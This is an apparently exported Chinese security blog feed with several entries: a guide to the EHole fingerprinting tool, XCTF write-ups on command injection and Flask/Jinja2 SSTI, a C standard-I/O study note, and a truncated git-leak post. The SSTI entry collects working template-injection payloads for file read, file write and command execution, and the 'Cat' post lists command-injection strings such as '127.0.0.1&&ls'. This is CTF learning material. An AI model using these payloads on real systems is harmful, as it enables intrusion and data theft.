    <content><![CDATA[<h1 id="指纹识别-EHole"><a href="#指纹识别-EHole" class="headerlink" title="指纹识别-EHole"></a>指纹识别-EHole</h1><h1 id="EHole"><a href="#EHole" class="headerlink" title="EHole"></a>EHole</h1><p>因为这个工具是go写的，下下来之后需要自己编译一下。浅看了一下，先换源再编译。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">go env -w GO111MODULE=on</span><br><span class="line">go env -w GOPROXY=https://goproxy.cn,direct</span><br><span class="line">#此命令需要在go.mod同级目录下执行。</span><br><span class="line">go mod tidy</span><br><span class="line"></span><br><span class="line">最后</span><br><span class="line">go build</span><br></pre></td></tr></table></figure>

<p>现在可以开始使用一些参数</p>
<p>其实他readme文件里面写的也很清楚了啊</p>
<h3 id="00x02-使用："><a href="#00x02-使用：" class="headerlink" title="[# 00x02] 使用："></a>[# 00x02] 使用：</h3><p>配合[红队中易被攻击的一些重点系统漏洞整理]食用效果更佳：<a href="https://forum.ywhack.com/bountytips.php?Vulnerability">https://forum.ywhack.com/bountytips.php?Vulnerability</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">EHole version: 2.0</span><br><span class="line">Usage: Ehole [-f|-l] [parameter]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -f string</span><br><span class="line">        Fofa searches <span class="keyword">for</span> assets , supports IP and IP segments。(192.168.1.1 | 192.168.1.0/24)</span><br><span class="line">  -ftime string</span><br><span class="line">        fofa timeout (default <span class="string">&quot;10&quot;</span>)</span><br><span class="line">  -h    this <span class="built_in">help</span></span><br><span class="line">  -json string</span><br><span class="line">        out json</span><br><span class="line">  -l string</span><br><span class="line">        Probe based on <span class="built_in">local</span> file</span><br><span class="line">  -<span class="built_in">log</span> string</span><br><span class="line">        Log file name (default <span class="string">&quot;server.log&quot;</span>)</span><br><span class="line">  -t string</span><br><span class="line">        thread (default <span class="string">&quot;100&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>EHole(棱洞)2.0提供了<strong>两种</strong>指纹识别方式，可从本地读取识别，也可以从FOFA进行批量调用API识别(需要FOFA密钥)，同时支持结果JSON格式输出。</p>
<p><strong>1.本地识别：</strong></p>
<p><code>.\ehole.exe finger -l url.txt</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">EHole -l url.txt   //URL地址需带上协议,每行一个</span><br></pre></td></tr></table></figure>

<p><strong>2.FOFA识别:</strong></p>
<p>注意：从FOFA识别需要配置FOFA 密钥以及邮箱，在config.ini内配置好密钥以及邮箱即可使用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">EHole -f 192.168.1.1/24  //支持单IP或IP段</span><br></pre></td></tr></table></figure>

<p><strong>3.结果输出：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">EHole -l url.txt -json export.json  //结果输出至export.json文件</span><br></pre></td></tr></table></figure>

<h3 id="00x03-指纹编写："><a href="#00x03-指纹编写：" class="headerlink" title="[# 00x03] 指纹编写："></a>[# 00x03] 指纹编写：</h3><p>EHole(棱洞)2.0改变了原有的指纹识别规则，2.0版指纹从外部文件读入，识别方式：</p>
<p><strong>指纹格式：</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">关键字匹配：</span><br><span class="line">&#123;</span><br><span class="line">		<span class="attr">&quot;cms&quot;</span>: <span class="string">&quot;seeyon&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;method&quot;</span>: <span class="string">&quot;keyword&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;location&quot;</span>: <span class="string">&quot;body&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;keyword&quot;</span>: [<span class="string">&quot;/seeyon/USER-DATA/IMAGES/LOGIN/login.gif&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">faviconhash匹配：</span><br><span class="line">&#123;</span><br><span class="line">		<span class="attr">&quot;cms&quot;</span>: <span class="string">&quot;CapRover&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;method&quot;</span>: <span class="string">&quot;faviconhash&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;location&quot;</span>: <span class="string">&quot;body&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;keyword&quot;</span>: [<span class="string">&quot;988422585&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>cms：系统名称</li>
<li>method：识别方式 (支持三种识别方式，分别为：keyword、faviconhash、regula)</li>
<li>location：位置（指纹识别位置，提供两个位置，一个为body，一个为header）</li>
<li>keyword：关键字（favicon图标hash、正则表达式、关键字）</li>
</ol>
<p>⚠️注意：keyword支持多关键字匹配，需要所有关键字匹配上才能识别。如：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;keyword&quot;</span>: [<span class="string">&quot;sys/ui/extend/theme/default/style/icon.css&quot;</span>, <span class="string">&quot;sys/ui/extend/theme/default/style/profile.css&quot;</span>]</span><br></pre></td></tr></table></figure>

<h3 id="00x04-使用效果："><a href="#00x04-使用效果：" class="headerlink" title="[# 00x04] 使用效果："></a>[# 00x04] 使用效果：</h3><p><img src="/2023/02/12/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB-EHole/image-20230212011502051.png" alt="image-20230212011502051"></p>
<p><img src="/2023/02/12/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB-EHole/image-20230212011512364.png" alt="image-20230212011512364"></p>
]]></content>
      <categories>
        <category>-tools</category>
      </categories>
  </entry>
  <entry>
    <title>攻防世界 Cat url编码超过 @参数</title>
    <url>/2022/01/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Cat-url%E7%BC%96%E7%A0%81%E8%B6%85%E8%BF%87@%E5%8F%82%E6%95%B0/</url>
    <content><![CDATA[<h1 id="攻防世界-Cat-url编码超过-参数"><a href="#攻防世界-Cat-url编码超过-参数" class="headerlink" title="攻防世界 Cat url编码超过 @参数"></a>攻防世界 Cat url编码超过 @参数</h1><p><img src="/2022/01/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Cat-url%E7%BC%96%E7%A0%81%E8%B6%85%E8%BF%87@%E5%8F%82%E6%95%B0/image-20220103085511643.png" alt="image-20220103085511643"></p>
<p>打开题目，是这样一个界面</p>
<p>先随便输入一个域名</p>
<p><img src="/2022/01/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Cat-url%E7%BC%96%E7%A0%81%E8%B6%85%E8%BF%87@%E5%8F%82%E6%95%B0/image-20220103085846359.png" alt="image-20220103085846359"></p>
<p>发现url中有了参数，</p>
<p>再尝试输入127.0.0.1</p>
<p><img src="/2022/01/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Cat-url%E7%BC%96%E7%A0%81%E8%B6%85%E8%BF%87@%E5%8F%82%E6%95%B0/image-20220103090800111.png" alt="image-20220103090800111"></p>
<p>是一个ping命令功能框，经过尝试，127.0.0.1&amp;&amp;dir、127.0.0.1&amp;&amp;ls、127.0.0.1|ls均被屏蔽。</p>
<p>在url处 发现当传入url编码的值后，可以解析。当传入%80等之后的值发现报错。</p>
<p>由于url编码是16进制 ascii范围是0-127 所以%80大于127 导致了报错。</p>
<p>附上一张ASCII编码的表<a href="https://baike.baidu.com/item/ASCII/309296?fr=aladdin">ASCII_百度百科 (baidu.com)</a></p>
<p><img src="/2022/01/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Cat-url%E7%BC%96%E7%A0%81%E8%B6%85%E8%BF%87@%E5%8F%82%E6%95%B0/image-20220103100316436.png" alt="image-20220103100316436"></p>
<p>发现使用的框架</p>
<p><img src="/2022/01/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Cat-url%E7%BC%96%E7%A0%81%E8%B6%85%E8%BF%87@%E5%8F%82%E6%95%B0/image-20220103100617946.png" alt="image-20220103100617946"></p>
<p>发现了数据库信息</p>
<p><img src="/2022/01/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Cat-url%E7%BC%96%E7%A0%81%E8%B6%85%E8%BF%87@%E5%8F%82%E6%95%B0/image-20220103100659567.png" alt="image-20220103100659567"></p>
<p>记录关键地址opt/api/database.sqlite</p>
<p>百度了一下发现了@参数没有被禁止</p>
<p><img src="/2022/01/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Cat-url%E7%BC%96%E7%A0%81%E8%B6%85%E8%BF%87@%E5%8F%82%E6%95%B0/1.png" alt="img"></p>
<p>输入@opt/api/database.sqlite</p>
<p>出现一个新的页面，通过关键词搜索ctf发现了flag</p>
<p><img src="/2022/01/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Cat-url%E7%BC%96%E7%A0%81%E8%B6%85%E8%BF%87@%E5%8F%82%E6%95%B0/image-20220103103926563.png" alt="image-20220103103926563"></p>
<p>总结：</p>
<p>1.url编码超过%80报错</p>
<p>2.datebase里面的关键信息</p>
<p>3.@参数的使用</p>
]]></content>
      <categories>
        <category>-Experience</category>
      </categories>
  </entry>
  <entry>
    <title>攻防世界 Confusion1 ssti漏洞系统讲解</title>
    <url>/2022/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Confusion1-ssti%E6%BC%8F%E6%B4%9E%E7%B3%BB%E7%BB%9F%E8%AE%B2%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="攻防世界-Confusion1"><a href="#攻防世界-Confusion1" class="headerlink" title="攻防世界 Confusion1"></a>攻防世界 Confusion1</h1><p><img src="/2022/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Confusion1-ssti%E6%BC%8F%E6%B4%9E%E7%B3%BB%E7%BB%9F%E8%AE%B2%E8%A7%A3/image-20220103171818134.png" alt="image-20220103171818134">打开题目是这样</p>
<p>在题目描述中让我们不要使用扫描器，那我们就扫一下。</p>
<p><img src="/2022/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Confusion1-ssti%E6%BC%8F%E6%B4%9E%E7%B3%BB%E7%BB%9F%E8%AE%B2%E8%A7%A3/image-20220103171853624.png" alt="image-20220103171853624"></p>
<p>发现flag.sql</p>
<p>随即访问</p>
<p><img src="/2022/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Confusion1-ssti%E6%BC%8F%E6%B4%9E%E7%B3%BB%E7%BB%9F%E8%AE%B2%E8%A7%A3/image-20220103171917930.png" alt="image-20220103171917930"></p>
<p>一时没有找到什么身份伪造的办法，看看其他地方</p>
<p>在源代码中发现注释</p>
<p><img src="/2022/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Confusion1-ssti%E6%BC%8F%E6%B4%9E%E7%B3%BB%E7%BB%9F%E8%AE%B2%E8%A7%A3/image-20220103172004765.png" alt="image-20220103172004765"></p>
<p>访问这个地址</p>
<p><img src="/2022/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Confusion1-ssti%E6%BC%8F%E6%B4%9E%E7%B3%BB%E7%BB%9F%E8%AE%B2%E8%A7%A3/image-20220103172026796.png" alt="image-20220103172026796"></p>
<p>获得两个提示，先记录下来，访问上面的地址也访问不了，但是查看报错页面发现这个提示在报错页面同样有。</p>
<p>看了下wp</p>
<p>ssti漏洞</p>
<p><img src="/2022/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Confusion1-ssti%E6%BC%8F%E6%B4%9E%E7%B3%BB%E7%BB%9F%E8%AE%B2%E8%A7%A3/image-20220103175513573.png" alt="image-20220103175513573"></p>
<p>tplmap没弄出来，用了大佬的payload，TVTVTVTVTVTVT</p>
<p><a href="https://www.freebuf.com/column/187845.html">从零学习flask模板注入 - FreeBuf网络安全行业门户</a></p>
<p>随即学习一下模板注入</p>
<h1 id="ssti漏洞"><a href="#ssti漏洞" class="headerlink" title="ssti漏洞"></a>ssti漏洞</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>先看一段代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> flask </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_word</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello word&#x27;</span></span><br></pre></td></tr></table></figure>

<p><code>route</code>装饰器的作用是将函数与url绑定起来。例子中的代码的作用就是当你访问<code>http://127.0.0.1：5000/index</code>的时候，flask会返回hello word。</p>
<p>渲染方法</p>
<p>flask的渲染方法有render_template和render_template_string两种。</p>
<p>render_template()是用来渲染一个指定的文件的。使用如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>render_template_string则是用来渲染一个字符串的。SSTI与这个方法密不可分。</p>
<p>使用方法如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">html = <span class="string">&#x27;&lt;h1&gt;This is index page&lt;/h1&gt;&#x27;</span></span><br><span class="line"><span class="keyword">return</span> render_template_string(html)</span><br></pre></td></tr></table></figure>



<h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p>在Jinja2模板引擎中，<code>&#123;&#123;&#125;&#125;</code>是变量包裹标识符。<code>&#123;&#123;&#125;&#125;</code>并不仅仅可以传递变量，还可以执行一些简单的表达式。</p>
<p>访问就可以看到flask中的全局变量和权限</p>
<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>python的对象的继承来一步步实现文件读取和命令执行的</p>
<p>找到父类<code>&lt;type &#39;object&#39;&gt;</code>–&gt;寻找子类–&gt;找关于命令执行或者文件操作的模块。</p>
<p>几个魔术方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br><span class="line">__init__.func_globals.keys() 查看全局函数</span><br><span class="line">.__init__.func_globals.values()[] 调用这个全局函数</span><br><span class="line">__import__ 动态导入模块 </span><br><span class="line">[&#x27;eval&#x27;](&#x27;__import__(%22os%22).popen(%22ls%22).read())</span><br><span class="line">导入模块然后读取文件</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/u011377996/article/details/86776181">(29条消息) SSTI模板注入_0verWatch的博客-CSDN博客_模板注入</a></p>
<p><a href="https://blog.csdn.net/MIGENGKING/article/details/105717164">(29条消息) 攻防世界Web_python_template_injection_MIGENGKING的博客-CSDN博客</a></p>
<p>简单！</p>
<p>常见payload收集</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//获取基本类</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">object</span></span><br><span class="line"></span><br><span class="line">//读文件</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r&#x27;C:\1.php&#x27;</span>).read()</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">40</span>](<span class="string">r&#x27;C:\1.php&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">//写文件</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/var/www/html/input&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/var/www/html/input&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"></span><br><span class="line">//执行任意命令</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span> )</span><br><span class="line"></span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br><span class="line"></span><br><span class="line">% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;_IterationGuard&#x27;</span> %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-Experience</category>
      </categories>
  </entry>
  <entry>
    <title>标准输入和输出、控制字符格式与运算符优先级</title>
    <url>/2023/10/02/%E6%A0%87%E5%87%86%E8%BE%93%E5%85%A5%E5%92%8C%E8%BE%93%E5%87%BA%E3%80%81%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6%E6%A0%BC%E5%BC%8F%E4%B8%8E%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7/</url>
    <content><![CDATA[<h1 id="标准输入和输出、控制字符格式与运算符优先级"><a href="#标准输入和输出、控制字符格式与运算符优先级" class="headerlink" title="标准输入和输出、控制字符格式与运算符优先级"></a>标准输入和输出、控制字符格式与运算符优先级</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>2024的考研大纲中同样也增加了这样的三个内容标准输入和输出、控制字符格式与运算符优先级。于是在这里详细学习一下。不学不行啊，md数学太难了，难得我头都要炸了，必须把专业课好好学，缓解一下数学的压力才行。专业课考到120的话，其他的，科目压力就不是很大了。</p>
<h1 id="标准输入和输出"><a href="#标准输入和输出" class="headerlink" title="标准输入和输出"></a>标准输入和输出</h1><p>首先了解标准输入和输出<br><strong>标准输出</strong>：C语言标准输出是一个接口库函数，已经写好了实现，我们只需要去调用它，就可以实现从终端中打印出信息。其实就是<strong>类似<code>printf</code></strong><br><strong>标准输入</strong>： <code>printf</code> 和 <code>scanf</code> 两个函数原型相同，但是 <code>scanf</code> 在用起来，还是有些让人抓狂的错误。标准输出就是库中定义的<strong>类似<code>scanf</code></strong></p>
<p>所谓标准输入输出，我们先理解为通过<strong>控制台来输入和显示内容</strong>，只要是个操作系统都会有控制台，这是最基本的人机交互方式，后面会详细讲解标准输入输出的概念。标准输入输出是C语言初学者第一个要越过的门槛，特别是<code>printf()</code>和<code>scanf()</code>这两个格式化输入输出函数，由于格式定义复杂导致很多人望而却步，其实标准输入输出函数<strong>并不是C语言定义的标准</strong>，而<strong>是stdio库中定义的函数</strong>，每个编译器实现不尽相同</p>
<p>我们这篇文章只讲6个函数，<code>printf，scanf，getchar，putchar，gets，puts</code></p>
<h2 id="printf和scanf"><a href="#printf和scanf" class="headerlink" title="printf和scanf"></a><code>printf</code>和<code>scanf</code></h2><p><code>printf()</code> 是一个C语言标准库中的函数，用于格式化输出数据到标准输出（通常指屏幕）。它可以将不同类型的值转换为字符串，并根据指定的格式字符串打印输出。</p>
<p>关于printf函数的<strong>运算顺序</strong></p>
<p><img src="/2023/10/02/%E6%A0%87%E5%87%86%E8%BE%93%E5%85%A5%E5%92%8C%E8%BE%93%E5%87%BA%E3%80%81%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6%E6%A0%BC%E5%BC%8F%E4%B8%8E%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7/image-20231002134154568.png" alt="image-20231002134154568"></p>
<p>这是我在之前的C语言碎碎念博客中提到的。这点需要注意一下。</p>
<p><code>scanf()</code> 是 C 语言标准库中的一个函数，用于从标准输入（通常指键盘输入）读取数据，并按照指定的格式进行解析。</p>
<p>这两个函数本身其实不是很重要，但是重要的是，他们的控制字符格式，以及各种控制字符格式对应的特性。这些我会在下面的控制字符格式中详细说明。</p>
<h2 id="getchar-和putchar-函数"><a href="#getchar-和putchar-函数" class="headerlink" title="getchar()和putchar()函数"></a><code>getchar()</code>和<code>putchar()</code>函数</h2><p>当从控制台输入输出单个字符时这两个函数的确比<code>printf()</code>和<code>scanf()</code>方便，因为不用编写格式控制符，特别是<code>getchar()</code>，对变量赋值时能返回输入字符，不需要赋值时能清空缓存，或者干脆放到末尾放置程序退出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getchar：能在屏幕上输入一个字符。</span><br><span class="line">putchar：它可以输出一个字符到屏幕上。</span><br></pre></td></tr></table></figure>

<p><strong><code>getchar</code>的例子</strong></p>
<p><img src="/2023/10/02/%E6%A0%87%E5%87%86%E8%BE%93%E5%85%A5%E5%92%8C%E8%BE%93%E5%87%BA%E3%80%81%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6%E6%A0%BC%E5%BC%8F%E4%B8%8E%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7/image-20231002131951357.png" alt="image-20231002131951357"></p>
<p><strong><code>putchar</code>的例子</strong></p>
<p><img src="/2023/10/02/%E6%A0%87%E5%87%86%E8%BE%93%E5%85%A5%E5%92%8C%E8%BE%93%E5%87%BA%E3%80%81%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6%E6%A0%BC%E5%BC%8F%E4%B8%8E%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7/image-20231002132140868.png" alt="image-20231002132140868"></p>
<h2 id="gets-和puts"><a href="#gets-和puts" class="headerlink" title="gets()和puts()"></a>gets()和puts()</h2><p>puts()最大的特点是自动在末尾添加换行符，虽然不能忠实反应输出内容，但是极大方便了行输出，对应的gets()会读取并自动丢弃缓存中换行符并且忽略字符串中间的空格符，极大方便了行输入。</p>
<p><strong>puts的例子</strong></p>
<p><img src="/2023/10/02/%E6%A0%87%E5%87%86%E8%BE%93%E5%85%A5%E5%92%8C%E8%BE%93%E5%87%BA%E3%80%81%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6%E6%A0%BC%E5%BC%8F%E4%B8%8E%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7/image-20231002133015231.png" alt="image-20231002133015231"></p>
<p><strong>gets的例子</strong>（我的编译器版本太高了，已经没gets了，就写个程序得了）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter a string: &quot;</span>);</span><br><span class="line">    gets(str);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You entered: %s\n&quot;</span>, str);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="控制字符格式"><a href="#控制字符格式" class="headerlink" title="控制字符格式"></a>控制字符格式</h1><p>这里面的讲究还是有很多的</p>
<h2 id="type类型"><a href="#type类型" class="headerlink" title="type类型"></a>type类型</h2><p><img src="/2023/10/02/%E6%A0%87%E5%87%86%E8%BE%93%E5%85%A5%E5%92%8C%E8%BE%93%E5%87%BA%E3%80%81%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6%E6%A0%BC%E5%BC%8F%E4%B8%8E%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7/aa84edfc4d854375b1a5a68ee4318d49.png" alt="在这里插入图片描述"></p>
<h2 id="flags"><a href="#flags" class="headerlink" title="flags"></a>flags</h2><p>flags 规定输出样式，%后面可以跟 0 个或多个以下标志：</p>
<p><img src="/2023/10/02/%E6%A0%87%E5%87%86%E8%BE%93%E5%85%A5%E5%92%8C%E8%BE%93%E5%87%BA%E3%80%81%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6%E6%A0%BC%E5%BC%8F%E4%B8%8E%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7/2641bbfe00f249c784f28ed86cf25544.png" alt="在这里插入图片描述"></p>
<h2 id="width"><a href="#width" class="headerlink" title="width"></a>width</h2><p>最小的输出宽度，用十进制数来表示输出的最小位数</p>
<p><img src="/2023/10/02/%E6%A0%87%E5%87%86%E8%BE%93%E5%85%A5%E5%92%8C%E8%BE%93%E5%87%BA%E3%80%81%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6%E6%A0%BC%E5%BC%8F%E4%B8%8E%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7/89b84965da5f4c21800f711d113f35c7.png" alt="在这里插入图片描述"></p>
<h2 id="precision-精度"><a href="#precision-精度" class="headerlink" title="precision 精度"></a>precision 精度</h2><p><img src="/2023/10/02/%E6%A0%87%E5%87%86%E8%BE%93%E5%85%A5%E5%92%8C%E8%BE%93%E5%87%BA%E3%80%81%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6%E6%A0%BC%E5%BC%8F%E4%B8%8E%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7/a931a90546764d92a623d5490fb0308d.png" alt="在这里插入图片描述"></p>
<h2 id="length-长度修饰符"><a href="#length-长度修饰符" class="headerlink" title="length 长度修饰符"></a>length 长度修饰符</h2><p><img src="/2023/10/02/%E6%A0%87%E5%87%86%E8%BE%93%E5%85%A5%E5%92%8C%E8%BE%93%E5%87%BA%E3%80%81%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6%E6%A0%BC%E5%BC%8F%E4%B8%8E%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7/6418658c4f954cb7b81866765efef0a4.png" alt="在这里插入图片描述"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%hd\n&quot;</span>, <span class="number">12345</span>); <span class="comment">//将数据以 short int 类型进行转换</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, <span class="number">12345</span>); <span class="comment">//将数据以 long int 类型进行转换</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, <span class="number">12345</span>); <span class="comment">//将数据以 long long int 类型进行转换</span></span><br></pre></td></tr></table></figure>



<h1 id="运算优先符"><a href="#运算优先符" class="headerlink" title="运算优先符"></a>运算优先符</h1><p>给出一个顺口溜把</p>
<p>C语言常用运算符的优先级口诀是：“单算关逻条赋逗”；<br>如果加入位运算符，完整口诀是：“单算移关与，异或逻条赋”。<br>■“单”表示单目运算符：逻辑非(!),按位取反(~),自增(++),自减(–),取地址(&amp;),取值(<code>*</code>);<br>■“算”表示算术运算符：乘、除和求余(<code>*</code>,/,%)级别高于加减(+,-)；<br>■“移”表示按位左移(&lt;&lt;)和位右移(&gt;&gt;)；<br>■“关”表示关系运算符：大小关系(&gt;,&gt;=,&lt;,&lt;=)级别高于相等不相等关系(==,!=)；<br>■“与”表示按位与(&amp;)；<br>■“异”表示按位异或(^)；<br>■“或”表示按位或(|)；<br>■“逻”表示逻辑运算符：逻辑与(&amp;&amp;)级别高于逻辑或(||)；<br>■“条”表示条件运算符(? :)；<br>■“赋”表示赋值运算符(=,+=,-=,*=,/=,%=,&gt;&gt;=,&lt;&lt;=,&amp;=,^=, |=,!=)；<br>◆另，逗号运算符(,) 级别最低，口诀中没有表述，需另加记忆..</p>
]]></content>
      <categories>
        <category>-c</category>
      </categories>
  </entry>
  <entry>
    <title>攻防世界 mfw git泄露</title>
    <url>/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<h1 id="攻防世界-mfw-git泄露"><a href="#攻防世界-mfw-git泄露" class="headerlink" title="攻防世界 mfw git泄露"></a>攻防世界 mfw git泄露</h1><p>由于昨天才学了git，找一道题来练练手</p>
